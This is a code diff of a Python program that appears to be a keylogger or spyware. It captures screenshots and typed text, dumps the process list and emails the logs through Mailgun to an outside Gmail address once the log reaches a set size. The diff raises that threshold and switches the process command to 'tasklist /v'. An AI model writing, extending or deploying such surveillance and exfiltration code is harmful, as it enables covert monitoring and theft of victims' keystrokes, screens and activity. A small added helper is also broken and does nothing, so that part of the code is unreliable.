@@ -5,6 +5,11 @@ import time
 import pyscreenshot as ImageGrab
 import subprocess
 
+def processlist_sort():
+    file = open("Process_list.txt", "r")
+    sortedlist = file.read()
+    sortedlist.replace("\r\r\n'b'", "\t")
+
 def screenShot():
     # fullscreen
     im=ImageGrab.grab()
@@ -32,7 +37,6 @@ def file_input(recorded):
 
 def file_write(typedstr):
     w = open("LOG.txt", 'a')
-
     w.write("\n")
     w.write(typedstr)
     w.write("\n")
@@ -58,15 +62,15 @@ def send_LOG():
         data={"from": "PSLOGFILEMANAGER <postmaster@mg.ladmail.com>",
               "to": "lad <hth225@gmail.com>",
               "subject": "Hello lad, Here is captured Process Logfile",
-              "text": "CAPTURED PROCESS LOGFILE"
+              "text": "CAPTURED PROCESS LOGFILE you should view on google docs"
               })
 
 def parse_process_list():
-    cmd = 'WMIC PROCESS get Caption,Commandline,Processid'
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-    file = open("Process_list.txt", "w")
-    for line in proc.stdout:
-        file.write(str(line))
+    cmd = 'tasklist /v'
+    proc = subprocess.getoutput(cmd).split("\n")
+    file = open("Process_list.txt", "w+")
+    file.write(str(proc))
+    file.close()
 
 if __name__ == "__main__":
 
@@ -85,7 +89,7 @@ if __name__ == "__main__":
          with open('LOG.txt') as f:
              count = (sum(1 for _ in f))
 
-         if (count >= 20):
+         if (count >= 100):
             parse_process_list()
             send_simple_message(file_content)
             send_LOG()
